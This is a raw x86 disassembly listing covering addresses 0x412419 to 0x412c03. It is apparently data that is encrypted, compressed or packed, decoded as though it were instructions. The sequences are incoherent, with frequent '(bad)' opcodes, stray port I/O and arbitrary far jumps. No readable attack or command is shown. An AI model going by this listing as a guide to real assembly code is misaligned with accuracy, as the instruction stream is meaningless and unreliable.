  412419:	dec    ebx
  41241a:	xor    al,0x8e
  41241c:	shl    DWORD PTR [ecx+eiz*4],1
  41241f:	xchg   ebp,eax
  412420:	mov    bh,0x77
  412422:	and    eax,0x67522765
  412427:	push   0xffffffef
  412429:	mov    BYTE PTR [ebx],ah
  41242b:	push   esp
  41242c:	loop   0x412486
  41242e:	sbb    bl,BYTE PTR [ebx+0x3f9cc38c]
  412434:	xor    eax,DWORD PTR [ebp-0x5874dee]
  41243a:	out    dx,eax
  41243b:	mov    ah,0xa1
  41243d:	retf   
  41243e:	ret    
  41243f:	int3   
  412440:	pop    ecx
  412441:	push   edx
  412442:	aad    0x72
  412444:	mov    esp,edi
  412446:	xchg   ebx,eax
  412447:	in     eax,0x5e
  412449:	push   esp
  41244a:	pop    esi
  41244b:	push   0xffffffa0
  41244d:	adc    esp,eax
  41244f:	and    BYTE PTR ds:0x9760ac08,0x82
  412456:	sar    BYTE PTR [ebp-0x1],0x51
  41245a:	pop    ss
  41245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41245c:	xor    eax,0x8a25c80f
  412461:	push   es
  412462:	int3   
  412463:	lods   al,BYTE PTR ds:[esi]
  412464:	jg     0x41244c
  412466:	or     ebx,DWORD PTR [ebx+0x93437e0]
  41246c:	xchg   edx,eax
  41246d:	add    al,0xc9
  41246f:	mov    ds:0x6a225b7b,al
  412474:	in     al,dx
  412475:	lds    eax,FWORD PTR [ebp-0x2]
  412478:	(bad)  
  41247b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41247c:	bound  eax,QWORD PTR [ecx-0x6d]
  41247f:	adc    DWORD PTR [eax],eax
  412481:	push   eax
  412482:	(bad)  
  412484:	adc    DWORD PTR [edi-0x10],ecx
  412487:	(bad)  
  412488:	fistp  QWORD PTR [ebx]
  41248a:	xchg   esp,eax
  41248b:	lods   al,BYTE PTR ds:[esi]
  41248c:	mov    cl,0x84
  41248e:	sar    esp,cl
  412490:	inc    ebx
  412491:	xor    bh,BYTE PTR [eax+esi*2+0x226f5e80]
  412498:	push   es
  412499:	xchg   edi,eax
  41249a:	and    BYTE PTR [edi+0x3c],al
  41249d:	and    dh,BYTE PTR [ebx]
  41249f:	pop    eax
  4124a0:	pop    eax
  4124a1:	cmp    BYTE PTR [eax+0x62ed3a2],al
  4124a7:	in     eax,0xdd
  4124a9:	int3   
  4124aa:	cmc    
  4124ab:	cmp    edi,esp
  4124ad:	pop    esi
  4124ae:	jo     0x412477
  4124b0:	pop    ebx
  4124b1:	xor    DWORD PTR [edx-0x80557d1],esp
  4124b7:	sub    ch,BYTE PTR [edx-0x19904575]
  4124bd:	imul   esp,esp,0xffffffac
  4124c0:	not    DWORD PTR [edx]
  4124c2:	fstp   TBYTE PTR [edi+ecx*4]
  4124c5:	test   eax,0x3a86ac0e
  4124ca:	and    al,0x12
  4124cc:	push   es
  4124cd:	pop    es
  4124ce:	inc    ecx
  4124cf:	adc    al,BYTE PTR [ecx]
  4124d1:	pop    ss
  4124d2:	es cs inc ebp
  4124d5:	inc    BYTE PTR [eax+eiz*2]
  4124d8:	xor    ah,0xe
  4124db:	xchg   esp,eax
  4124dc:	cmp    bl,BYTE PTR ss:[edi+0x27157c6b]
  4124e3:	adc    BYTE PTR [ecx+0x5f],cl
  4124e6:	fldcw  WORD PTR ds:0x7693e1
  4124ec:	ins    BYTE PTR es:[edi],dx
  4124ed:	jl     0x4124d2
  4124ef:	pop    ebx
  4124f0:	mov    ch,0xac
  4124f2:	sbb    al,BYTE PTR [eax+0x70]
  4124f5:	ja     0x412528
  4124f7:	stc    
  4124f8:	outs   dx,BYTE PTR ds:[esi]
  4124f9:	pop    esi
  4124fa:	aaa    
  4124fb:	out    dx,eax
  4124fc:	jno    0x412483
  4124fe:	pop    eax
  4124ff:	pop    ds
  412500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412501:	mov    edx,0xff50b110
  412506:	stos   BYTE PTR es:[edi],al
  412507:	sub    edx,DWORD PTR [esi-0x73]
  41250a:	push   0x55
  41250c:	sbb    dl,bl
  41250e:	pop    ds
  41250f:	das    
  412510:	pop    edi
  412511:	outs   dx,DWORD PTR ds:[esi]
  412512:	ja     0x4124b3
  412514:	loope  0x412527
  412516:	xor    DWORD PTR [esi+0x72842c36],0x791bfd2f
  412520:	mov    edx,0x7af6c66
  412525:	push   es
  412526:	popa   
  412527:	adc    esi,DWORD PTR [esi+ebx*1]
  41252a:	or     eax,esp
  41252c:	sbb    DWORD PTR [ebx-0x60b23d66],ecx
  412532:	jge    0x412538
  412534:	in     eax,dx
  412535:	inc    esi
  412536:	jle    0x412586
  412538:	pop    es
  412539:	push   ss
  41253a:	outs   dx,BYTE PTR ds:[esi]
  41253b:	das    
  41253c:	imul   ecx,DWORD PTR [edi+esi*8],0x219c512c
  412543:	js     0x412544
  412545:	cmp    BYTE PTR ds:0x8d54e630,dl
  41254b:	gs gs sahf 
  41254e:	ja     0x4124f2
  412550:	pushf  
  412551:	xchg   esp,eax
  412552:	pusha  
  412553:	sbb    edx,esp
  412555:	sub    edx,esp
  412557:	lahf   
  412558:	ret    0xd65a
  41255b:	aaa    
  41255c:	push   ecx
  41255d:	cmp    al,dh
  41255f:	stos   BYTE PTR es:[edi],al
  412560:	inc    esi
  412561:	or     eax,0xfea6bf55
  412566:	pop    ss
  412567:	push   ds
  412568:	clc    
  412569:	dec    edx
  41256a:	xchg   edx,eax
  41256b:	or     ecx,esp
  41256d:	or     eax,0x9aa5898a
  412572:	shr    al,1
  412574:	test   BYTE PTR [edx+ecx*8],dl
  412577:	dec    esp
  412578:	add    edi,DWORD PTR [edx+0x23229858]
  41257e:	data16 mov al,ds:0xe106c832
  412584:	(bad)  
  412585:	jne    0x412533
  412587:	mov    BYTE PTR [edx+eax*1-0x781504bb],cl
  41258e:	jns    0x41260a
  412590:	cmp    al,0xe3
  412592:	(bad)  
  412593:	(bad)  
  412594:	dec    edi
  412595:	jbe    0x4125f4
  412597:	push   esp
  412598:	mov    cl,0x67
  41259a:	ds add eax,0x6a3b8f51
  4125a0:	jmp    0x82c7:0x11407c27
  4125a7:	aaa    
  4125a8:	mov    ecx,0xc528e2d9
  4125ad:	arpl   WORD PTR [ecx+0x2f28cc8b],ax
  4125b3:	pushf  
  4125b4:	js     0x412578
  4125b6:	(bad)
  4125b9:	xchg   ecx,eax
  4125ba:	out    0x36,eax
  4125bc:	ret    0xf863
  4125bf:	push   0x6f6fc18c
  4125c4:	out    0x4f,eax
  4125c6:	jmp    0xee26:0x6f6defd7
  4125cd:	add    al,0xaa
  4125cf:	dec    ebp
  4125d0:	xchg   edx,eax
  4125d1:	repz pop ecx
  4125d3:	push   es
  4125d4:	mov    ah,0x0
  4125d6:	pop    ecx
  4125d7:	mov    ds:0xd34151b,eax
  4125dc:	ror    dh,0x16
  4125df:	mov    es,edx
  4125e1:	out    0x69,al
  4125e3:	push   0xfc2d0bc1
  4125e8:	jecxz  0x4125ee
  4125ea:	or     dl,ch
  4125ec:	fmulp  st(2),st
  4125ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125ef:	cvtps2pd xmm0,QWORD PTR [edx-0x6f]
  4125f3:	imul   ebx,DWORD PTR [ecx],0x983e6ad5
  4125f9:	cmpxchg bl,dh
  4125fc:	xor    eax,esi
  4125fe:	dec    esi
  4125ff:	retf   0xdeab
  412602:	fmul   QWORD PTR [esi+0x28cfb81d]
  412608:	and    al,0xf5
  41260a:	or     al,0xb1
  41260c:	pushf  
  41260d:	aaa    
  41260e:	add    bh,0xd9
  412611:	test   al,0x64
  412613:	retf   
  412614:	pop    esi
  412615:	outs   dx,BYTE PTR ds:[esi]
  412616:	mov    ah,BYTE PTR [esp+edi*4-0x6a9e3e7]
  41261d:	mov    dl,0xa2
  41261f:	retf   0xacb5
  412622:	(bad)  [eax-0x608b6477]
  412628:	cs data16 mov ch,0x18
  41262c:	stos   BYTE PTR es:[edi],al
  41262d:	dec    ebp
  41262e:	dec    ebp
  41262f:	xlat   BYTE PTR ds:[ebx]
  412630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412631:	xchg   esi,eax
  412632:	xbegin 0x1e40bf7e
  412638:	jbe    0x4125f0
  41263a:	das    
  41263b:	not    dh
  41263d:	icebp  
  41263e:	idiv   DWORD PTR [edi-0x213b06ba]
  412644:	push   eax
  412645:	aas    
  412646:	leave  
  412647:	push   ecx
  412648:	or     cl,BYTE PTR [esi-0x4957ac4e]
  41264e:	retf   
  41264f:	xchg   edi,eax
  412650:	stc    
  412651:	inc    edx
  412652:	xor    bh,BYTE PTR [esi]
  412654:	xlat   BYTE PTR ds:[ebx]
  412655:	scas   al,BYTE PTR es:[edi]
  412656:	je     0x4125fa
  412658:	cdq    
  412659:	mov    edx,0x167af2ae
  41265e:	scas   eax,DWORD PTR es:[edi]
  41265f:	mov    bh,0x42
  412661:	jmp    0x412618
  412663:	or     ch,bh
  412665:	pop    ebp
  412666:	aad    0xba
  412668:	xor    DWORD PTR [edi+0x71],esp
  41266b:	sub    BYTE PTR [eax-0x1f],ch
  41266e:	xor    ah,BYTE PTR [edx-0x7e]
  412671:	shr    DWORD PTR [ecx+0x4f25cfbd],1
  412677:	cmp    esi,DWORD PTR [esp+eiz*4-0x75265f43]
  41267e:	loopne 0x4126ca
  412680:	pop    esi
  412681:	popf   
  412682:	push   esp
  412683:	mov    dl,dl
  412685:	cmp    al,0x45
  412687:	repz jne 0x41260a
  41268a:	scas   eax,DWORD PTR es:[edi]
  41268b:	adc    eax,0x834244d9
  412690:	fisubr DWORD PTR [eax]
  412692:	lea    esp,cs:0xfcfc3e8
  412699:	jmp    0x6e6004e9
  41269e:	aam    0xea
  4126a0:	sub    esp,ecx
  4126a2:	mov    ds:0xbb6bf362,al
  4126a7:	outs   dx,DWORD PTR ds:[esi]
  4126a8:	test   DWORD PTR [ebx+0x46],0x1ad7e0a6
  4126af:	xchg   edx,eax
  4126b0:	(bad)  
  4126b1:	mov    ch,0x38
  4126b3:	dec    eax
  4126b4:	xchg   ecx,eax
  4126b5:	adc    cl,ah
  4126b7:	call   0xd097:0xb7ff576b
  4126be:	add    DWORD PTR [ebx-0x60],esp
  4126c1:	and    eax,0x6d207772
  4126c6:	imul   edi,DWORD PTR [ecx+0x5],0x215bc457
  4126cd:	repz mov esp,0x7a081d14
  4126d3:	call   0x32af:0x129dfa67
  4126da:	aaa    
  4126db:	xor    BYTE PTR [ecx-0x44],ch
  4126de:	cli    
  4126df:	cli    
  4126e0:	fsubr  QWORD PTR [ebx]
  4126e2:	jb     0x4126ab
  4126e4:	sar    DWORD PTR [ebx+edi*2+0x74baa80c],1
  4126eb:	adc    ebx,esp
  4126ed:	imul   esp,DWORD PTR [ebx+0x6c600877],0xfffffff4
  4126f4:	jne    0x4126a1
  4126f6:	inc    ebp
  4126f7:	jg     0x4126e7
  4126f9:	je     0x41274c
  4126fb:	out    dx,eax
  4126fc:	ins    BYTE PTR es:[edi],dx
  4126fd:	xor    BYTE PTR ds:0xca4cc380,ah
  412703:	or     DWORD PTR [edi+0x15f4915a],ebp
  412709:	xchg   esp,eax
  41270a:	pop    edx
  41270b:	dec    ebx
  41270c:	mov    ebx,0x5a6c4f06
  412711:	into   
  412712:	or     al,0x3a
  412714:	sub    al,0xea
  412716:	add    eax,0x65025f5d
  41271b:	psubw  mm6,QWORD PTR [edi+0x7c6c830e]
  412722:	int    0xb0
  412724:	jl     0x41275e
  412726:	les    eax,FWORD PTR [edi-0x30]
  412729:	(bad)  
  41272b:	xchg   ebx,eax
  41272c:	jecxz  0x412782
  41272e:	mov    esi,DWORD PTR [ebx+0x4658f6ec]
  412734:	pop    ebx
  412735:	or     BYTE PTR [ebp-0x753cff8],dh
  41273b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41273c:	add    ecx,DWORD PTR [edi+0x4c8f8a01]
  412742:	fldenv [ebp-0x236b71e6]
  412748:	and    eax,0x4ea18045
  41274d:	ins    BYTE PTR es:[edi],dx
  41274e:	dec    eax
  41274f:	or     dl,dl
  412751:	mov    eax,ds:0xa4ca17a2
  412756:	mov    esi,0x481a12aa
  41275b:	in     eax,0x39
  41275d:	out    dx,al
  41275e:	sub    DWORD PTR [esi-0x29],esi
  412761:	or     al,BYTE PTR [ecx-0x616f9585]
  412767:	outs   dx,BYTE PTR ds:[esi]
  412768:	repz jmp 0x73f1:0x1ada85e9
  412770:	cmc    
  412771:	leave  
  412772:	data16 cmc 
  412774:	shr    BYTE PTR [esi+0x4b87d58c],1
  41277a:	xor    eax,0xe0a86c56
  41277f:	mov    eax,ds:0x222966cc
  412784:	sub    al,0x80
  412787:	scas   eax,DWORD PTR es:[edi]
  412788:	test   BYTE PTR [esi+0x1eef414b],al
  41278e:	in     eax,0x73
  412790:	js     0x412761
  412792:	dec    ebp
  412793:	pop    ebp
  412794:	ins    DWORD PTR es:[edi],dx
  412795:	sbb    edx,edx
  412797:	inc    ebp
  412798:	nop
  412799:	leave  
  41279a:	sub    DWORD PTR [esp+esi*4+0x59],edx
  41279e:	mov    edi,0x2168b861
  4127a3:	stos   BYTE PTR es:[edi],al
  4127a4:	sbb    ebx,edx
  4127a6:	(bad)  
  4127a7:	test   BYTE PTR [ecx],al
  4127a9:	pushf  
  4127aa:	push   eax
  4127ab:	and    BYTE PTR [edx+0x1c],ch
  4127ae:	or     ah,cl
  4127b0:	xchg   BYTE PTR [esi+0x26],dl
  4127b3:	pop    edx
  4127b4:	imul   edx,DWORD PTR [eax],0xfc395d92
  4127ba:	jb     0x4127d8
  4127bc:	mov    eax,es:0x3e8cdcbf
  4127c2:	loop   0x4127e0
  4127c4:	fdivrp st(3),st
  4127c6:	xchg   cl,bh
  4127c8:	add    ecx,esp
  4127ca:	ret    
  4127cb:	popa   
  4127cc:	pop    esi
  4127cd:	lock aam 0x8e
  4127d0:	lods   eax,DWORD PTR ds:[esi]
  4127d1:	xchg   esi,eax
  4127d2:	lahf   
  4127d3:	adc    ah,BYTE PTR [edi]
  4127d5:	jmp    0x4127ce
  4127d7:	jge    0x412785
  4127d9:	sub    DWORD PTR [ebx-0x42894713],0x3aa7405a
  4127e3:	add    BYTE PTR [esi],ah
  4127e5:	jbe    0x412812
  4127e7:	test   eax,0xd349b890
  4127ec:	out    0xd0,eax
  4127ee:	cmp    BYTE PTR [ebx],bh
  4127f0:	scas   al,BYTE PTR es:[edi]
  4127f1:	and    eax,0x1cc021e3
  4127f6:	out    dx,al
  4127f7:	mov    ebp,0xaf87fd12
  4127fc:	das    
  4127fd:	adc    edi,DWORD PTR [ecx]
  4127ff:	add    al,0x43
  412801:	push   cs
  412802:	mov    dl,0x7c
  412804:	xchg   esp,eax
  412805:	scas   al,BYTE PTR es:[edi]
  412806:	jmp    0xac70:0x83e3433a
  41280d:	dec    ebx
  41280e:	inc    edx
  41280f:	lods   al,BYTE PTR ds:[esi]
  412810:	cmc    
  412811:	and    BYTE PTR [edi+0x6028f34b],cl
  412817:	dec    ebp
  412818:	mov    bh,0xb3
  41281a:	xor    ebx,DWORD PTR [eax+esi*2+0x6e]
  41281e:	jp     0x4127df
  412820:	mov    edi,0x49f49d95
  412825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412826:	dec    eax
  412827:	popa   
  412828:	or     esi,eax
  41282a:	pop    ebx
  41282b:	or     eax,0x8b5e760
  412830:	push   ebp
  412831:	sbb    ah,BYTE PTR [edx+0x3b]
  412834:	xor    dh,BYTE PTR [edi-0x16]
  412837:	daa    
  412838:	sub    dh,BYTE PTR [edi+0x5b715180]
  41283e:	push   0x9553ca68
  412843:	aas    
  412844:	xor    bl,BYTE PTR [edx+0x50]
  412847:	and    DWORD PTR [ebp+0x4a],esp
  41284a:	mov    bh,0xd2
  41284c:	les    ecx,FWORD PTR [ecx]
  41284e:	rol    ch,0xf0
  412851:	fstp   DWORD PTR [edi]
  412853:	inc    esi
  412854:	sbb    BYTE PTR [ecx],0x25
  412857:	add    BYTE PTR [ebx-0x21f1499b],0xa8
  41285e:	fdiv   QWORD PTR [edi-0x58c415d3]
  412864:	xor    al,0x1
  412866:	shl    al,cl
  412868:	jns    0x41287d
  41286a:	pop    esp
  41286b:	or     esi,ebp
  41286d:	mov    bh,al
  41286f:	mov    al,ds:0xe0866450
  412874:	pop    esi
  412875:	sbb    DWORD PTR [eax],ebp
  412877:	and    ebx,esi
  412879:	inc    esp
  41287a:	cmp    al,0x96
  41287c:	add    ch,BYTE PTR [edx+0x751d142d]
  412882:	int    0x48
  412884:	xchg   ecx,eax
  412885:	test   eax,0x4907800d
  41288a:	(bad)  [edx+0x43]
  41288d:	jle    0x41286c
  41288f:	ins    BYTE PTR es:[edi],dx
  412890:	add    eax,0xb16ef7df
  412895:	or     BYTE PTR [ebp+eiz*1-0x30f0c5b8],bl
  41289c:	xchg   edi,eax
  41289d:	hlt    
  41289e:	test   eax,0x71fcb7e1
  4128a3:	fs xor bl,al
  4128a6:	add    ebp,esi
  4128a8:	xchg   ecx,eax
  4128a9:	dec    eax
  4128aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ab:	dec    ebx
  4128ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ad:	or     al,0x9c
  4128af:	adc    BYTE PTR [ecx],0xf1
  4128b2:	push   edi
  4128b3:	out    dx,eax
  4128b4:	out    dx,al
  4128b5:	loopne 0x4128b6
  4128b7:	fidiv  WORD PTR ds:0x65103adc
  4128bd:	or     eax,DWORD PTR [eax]
  4128bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c0:	enter  0x39c7,0x4
  4128c4:	xchg   esp,eax
  4128c5:	inc    ebp
  4128c6:	scas   al,BYTE PTR es:[edi]
  4128c7:	mov    dl,0xdc
  4128c9:	mov    eax,ds:0x7b84297a
  4128ce:	call   DWORD PTR [di+0x35]
  4128d2:	in     al,dx
  4128d3:	rcr    BYTE PTR [eax+0x11],0x4e
  4128d7:	push   esp
  4128d8:	test   eax,0x8d024e11
  4128dd:	je     0x4128e2
  4128df:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4128e1:	mul    DWORD PTR [edi]
  4128e3:	(bad)  [edi]
  4128e5:	call   0x33b7:0xb86fc156
  4128ec:	inc    edi
  4128ed:	mov    edi,0xf40b8be0
  4128f2:	inc    esp
  4128f3:	faddp  st(5),st
  4128f5:	fwait
  4128f6:	xor    eax,0x75dc434d
  4128fb:	jno    0x412899
  4128fd:	mov    al,0x98
  4128ff:	sbb    DWORD PTR [ebx],0x1
  412902:	out    dx,eax
  412903:	inc    ebp
  412904:	mov    eax,ds:0xa0e98c0d
  412909:	dec    ecx
  41290a:	or     esp,DWORD PTR ds:0xa9ddcc2a
  412910:	mov    esi,0x3e741410
  412915:	jmp    0x412976
  412917:	loop   0x412935
  412919:	aaa    
  41291a:	push   ecx
  41291b:	sahf   
  41291c:	stc    
  41291d:	push   ds
  41291e:	imul   esi,DWORD PTR [esp+ecx*1-0x3d],0x9
  412923:	dec    esi
  412924:	cwde   
  412925:	add    BYTE PTR [ebx],dl
  412927:	xchg   ecx,eax
  412928:	jno    0x412971
  41292a:	inc    esp
  41292b:	add    BYTE PTR [ebp+esi*8-0x67],0xc2
  412930:	bound  ecx,QWORD PTR [ebx+eax*2-0x18141ab5]
  412937:	cmp    BYTE PTR [edx],cl
  412939:	dec    eax
  41293a:	push   ds
  41293b:	mov    eax,ds:0xde48d173
  412940:	sar    DWORD PTR [eax],1
  412942:	std    
  412943:	adc    ebp,DWORD PTR es:[ebx]
  412946:	test   DWORD PTR [edi-0x45c7db6],0x1311295d
  412950:	in     al,0x96
  412952:	enter  0x451d,0x57
  412956:	mov    edi,0x46e5d04f
  41295b:	test   al,0x28
  41295d:	nop
  41295e:	(bad)  
  41295f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412960:	and    BYTE PTR [bx+si],bh
  412963:	jecxz  0x412904
  412965:	leave  
  412966:	std    
  412967:	shr    DWORD PTR [edi+0x14],cl
  41296a:	sahf   
  41296b:	dec    esp
  41296c:	or     ah,ah
  41296e:	dec    esi
  41296f:	mov    al,0xda
  412971:	mov    bh,0xaf
  412973:	mov    edx,edi
  412975:	sub    al,0xb4
  412977:	add    BYTE PTR [eax+0x68ce4cbd],dh
  41297d:	inc    esi
  41297e:	test   al,0x3a
  412980:	inc    edx
  412981:	mov    eax,0xdcc5c973
  412986:	js     0x4129e9
  412988:	add    BYTE PTR [ebx+0x1c3d37f5],0xf2
  41298f:	xchg   ebp,eax
  412990:	jns    0x412993
  412992:	lods   al,BYTE PTR ds:[esi]
  412993:	mov    edx,0xa428c030
  412998:	daa    
  412999:	jl     0x412956
  41299b:	add    al,0x84
  41299d:	and    BYTE PTR [ebx+0x267a4b85],dl
  4129a3:	rcl    DWORD PTR [edx+0x6573da53],1
  4129a9:	sbb    DWORD PTR [eax],esp
  4129ab:	cmp    DWORD PTR [ecx+edx*4-0x46],edx
  4129af:	(bad)  
  4129b0:	fisttp DWORD PTR [ebx-0x60]
  4129b3:	sub    edi,DWORD PTR [ebp+ecx*2+0x1c81dee5]
  4129ba:	cdq    
  4129bb:	fcom   DWORD PTR [eax]
  4129bd:	js     0x41294c
  4129bf:	sub    DWORD PTR [ebx-0x53],esi
  4129c2:	inc    ebx
  4129c3:	stos   DWORD PTR es:[edi],eax
  4129c4:	pop    es
  4129c5:	dec    ebx
  4129c6:	push   ss
  4129c7:	out    0xe9,eax
  4129c9:	aam    0x57
  4129cb:	mov    ds:0x165fc34b,eax
  4129d0:	das    
  4129d1:	stos   DWORD PTR es:[edi],eax
  4129d2:	pop    esp
  4129d3:	(bad)  
  4129d4:	ret    
  4129d5:	not    DWORD PTR [ebp-0x918e8a8]
  4129db:	or     edx,DWORD PTR [ebp+eax*1+0x1e03664b]
  4129e2:	mov    bh,0xdc
  4129e4:	mov    ds:0x8ce72778,al
  4129e9:	and    BYTE PTR [eax+0x62a9f0fe],dl
  4129ef:	jg     0x412973
  4129f1:	push   esp
  4129f2:	fwait
  4129f3:	mov    eax,ds:0x7535fb44
  4129f8:	mov    esp,fs
  4129fa:	daa    
  4129fb:	sub    ch,bh
  4129fd:	fs mov esi,0x95c8ea5d
  412a03:	lods   al,BYTE PTR ds:[esi]
  412a04:	(bad)  
  412a05:	adc    DWORD PTR [eax+0x7329727e],edx
  412a0b:	sub    ebx,DWORD PTR [ebx-0x3381ec59]
  412a11:	rcr    BYTE PTR [ebp+0x5e],1
  412a14:	imul   eax,DWORD PTR [ebx+0x2b11c9d],0x8da7b093
  412a1e:	cmp    bl,BYTE PTR [ebp+0x1a]
  412a21:	add    eax,0x5259b956
  412a26:	push   eax
  412a27:	push   edi
  412a28:	ror    DWORD PTR [eax+edx*1+0x5cfc733d],0x6a
  412a30:	add    DWORD PTR [ecx+0x724855d2],0x5935eace
  412a3a:	mov    ch,0x74
  412a3c:	mov    BYTE PTR [edi],bl
  412a3e:	jg     0x4129f8
  412a40:	cmp    BYTE PTR [eax-0x14],dl
  412a43:	dec    edi
  412a44:	sar    BYTE PTR [edi+eiz*4-0x7d],1
  412a48:	pop    edi
  412a49:	test   DWORD PTR [ecx+ebp*4+0x66],esi
  412a4d:	inc    edi
  412a4e:	xlat   BYTE PTR ds:[ebx]
  412a4f:	ds scas al,BYTE PTR es:[edi]
  412a51:	or     al,0x14
  412a53:	cli    
  412a54:	call   DWORD PTR [esi-0x30303d33]
  412a5a:	or     DWORD PTR [edx-0x40094d70],0x9
  412a61:	lahf   
  412a62:	rol    DWORD PTR [edi],0xc6
  412a65:	pusha  
  412a66:	rcr    DWORD PTR [edi-0x2c3ae725],0xab
  412a6d:	aam    0xdc
  412a6f:	(bad)  
  412a70:	sub    eax,0x424d6cf5
  412a75:	gs leave 
  412a77:	out    0xf6,eax
  412a79:	neg    DWORD PTR [eax+0x3376aea3]
  412a7f:	sub    ch,al
  412a81:	sub    ah,ah
  412a83:	sbb    esp,DWORD PTR [edx+0x10]
  412a86:	sub    BYTE PTR [esi+eiz*4-0x21],al
  412a8a:	loopne 0x412a44
  412a8c:	push   edi
  412a8d:	outs   dx,BYTE PTR ds:[esi]
  412a8e:	or     ah,al
  412a90:	inc    esi
  412a91:	(bad)  [edi+0x24]
  412a94:	mov    eax,ds:0xc46eadd7
  412a99:	xchg   BYTE PTR [ebx+0x4b],bl
  412a9c:	xchg   esp,eax
  412a9d:	add    BYTE PTR [ecx],al
  412a9f:	xchg   esp,eax
  412aa0:	aas    
  412aa1:	push   ebp
  412aa2:	aad    0xd4
  412aa4:	fcom   QWORD PTR [eax-0x20]
  412aa7:	mov    ch,0xd0
  412aa9:	add    BYTE PTR [ecx],al
  412aab:	mov    ds:0xc950d4ae,al
  412ab0:	gs cdq 
  412ab2:	pushf  
  412ab3:	shl    BYTE PTR [eax+0x2774e40a],1
  412ab9:	je     0x412a98
  412abb:	inc    ebp
  412abc:	cmp    DWORD PTR [esi-0x6c42ad72],esp
  412ac2:	icebp  
  412ac3:	mov    ds:0xa30f5313,eax
  412ac8:	lds    eax,FWORD PTR [eax]
  412aca:	(bad)  
  412acb:	mov    esi,0xd1ed4061
  412ad0:	inc    edi
  412ad1:	sbb    DWORD PTR [ebx-0x70efebeb],edi
  412ad7:	int3   
  412ad8:	cwde   
  412ad9:	(bad)  [edx+eax*4-0x1acf61ed]
  412ae0:	xchg   BYTE PTR [ebx+0x355830d1],cl
  412ae6:	mov    bl,0xc
  412ae8:	adc    BYTE PTR [ebx],ch
  412aea:	jl     0x412b1e
  412aec:	and    DWORD PTR [eax-0x8053497],edx
  412af2:	fisttp WORD PTR [esi]
  412af4:	xchg   ebx,eax
  412af5:	pop    ebp
  412af6:	dec    ebp
  412af7:	or     dl,al
  412af9:	and    al,0x87
  412afb:	aad    0xb3
  412afd:	daa    
  412afe:	mov    edi,DWORD PTR [edi+0x62]
  412b01:	call   0xfab0c0fc
  412b06:	jecxz  0x412ae6
  412b08:	sub    ah,bh
  412b0a:	inc    esp
  412b0b:	jo     0x412b74
  412b0d:	pusha  
  412b0e:	shl    eax,cl
  412b10:	scas   eax,DWORD PTR es:[edi]
  412b11:	xor    al,0x95
  412b13:	mov    ah,0xff
  412b15:	(bad)  
  412b16:	mov    ds:0x2d44f87a,al
  412b1b:	xor    eax,0xb36ba399
  412b20:	into   
  412b21:	push   edi
  412b22:	in     eax,0x9d
  412b24:	mov    ebx,0x2f1aa8a3
  412b29:	pop    edi
  412b2a:	add    edx,DWORD PTR [edx+eiz*2]
  412b2d:	mov    ebp,DWORD PTR [esi]
  412b2f:	xchg   ecx,eax
  412b31:	jnp    0x412b00
  412b33:	icebp  
  412b34:	and    eax,0xc37b31a4
  412b39:	sahf   
  412b3a:	fisubr DWORD PTR [eax]
  412b3c:	xor    eax,0x963c9887
  412b41:	(bad)  
  412b42:	cli    
  412b43:	test   bh,bl
  412b45:	cld    
  412b46:	(bad)  
  412b48:	mov    cl,0x98
  412b4a:	and    BYTE PTR [ebx+ecx*4+0x527e2e91],dl
  412b51:	out    dx,al
  412b52:	inc    eax
  412b53:	pop    ecx
  412b54:	out    0xed,eax
  412b56:	lds    esi,FWORD PTR ds:0x2a5c055b
  412b5c:	pop    eax
  412b5d:	dec    edi
  412b5e:	mov    esi,0x5d27cb88
  412b63:	ret    
  412b64:	dec    ebx
  412b65:	lds    ecx,FWORD PTR [ebp+0x70a20729]
  412b6b:	jb     0x412bdf
  412b6d:	xor    esi,DWORD PTR [edx+0x620c29e0]
  412b73:	mov    ch,0x50
  412b75:	mov    ds:0x3a8f3940,al
  412b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b7b:	push   0xc0891fc5
  412b80:	pop    edx
  412b81:	jmp    0x412b8c
  412b83:	lahf   
  412b84:	leave  
  412b85:	jge    0x412bf4
  412b87:	xlat   BYTE PTR ds:[ebx]
  412b88:	loop   0x412c00
  412b8a:	ja     0x412b42
  412b8c:	dec    eax
  412b8d:	lods   eax,DWORD PTR ds:[esi]
  412b8e:	sub    BYTE PTR [edx+0x24354a5f],ch
  412b94:	in     al,0x84
  412b96:	scas   al,BYTE PTR es:[edi]
  412b97:	and    ebp,esi
  412b99:	in     eax,0x24
  412b9b:	mov    ebx,0xcb7524e
  412ba0:	in     al,dx
  412ba1:	fs pushf 
  412ba3:	in     eax,dx
  412ba4:	ret    0x86ae
  412ba7:	mov    cl,0x1c
  412ba9:	add    ah,BYTE PTR [ecx]
  412bab:	dec    eax
  412bac:	mov    ds:0x79301f1,eax
  412bb1:	sub    DWORD PTR [esi],ebx
  412bb3:	into   
  412bb4:	and    bl,BYTE PTR [ebp+0x4fd73e75]
  412bba:	imul   ebp,DWORD PTR cs:[ecx],0x556db58c
  412bc1:	add    eax,0xb053d086
  412bc6:	add    eax,0x6d77a538
  412bcb:	cmp    eax,0xca476926
  412bd0:	inc    ebx
  412bd1:	jnp    0x412bd6
  412bd3:	dec    ebx
  412bd4:	fnstenv [ebx+0xa]
  412bd7:	add    eax,0x47c5b06d
  412bdc:	sbb    bl,ch
  412bde:	(bad)  
  412bdf:	jmp    0x412c34
  412be1:	push   esi
  412be2:	xchg   esp,eax
  412be3:	xor    BYTE PTR [edi+0x66],bl
  412be6:	push   edx
  412be7:	xlat   BYTE PTR ds:[ebx]
  412be8:	pop    edx
  412be9:	sub    eax,0xff11bd50
  412bee:	adc    cl,BYTE PTR [esi-0x66694b8c]
  412bf4:	lds    ebx,FWORD PTR [ebp+0x4bc00435]
  412bfa:	push   ss
  412bfb:	mov    DWORD PTR [esi+0x2334100e],eax
  412c01:	int    0x9
  412c03:	pop    edx
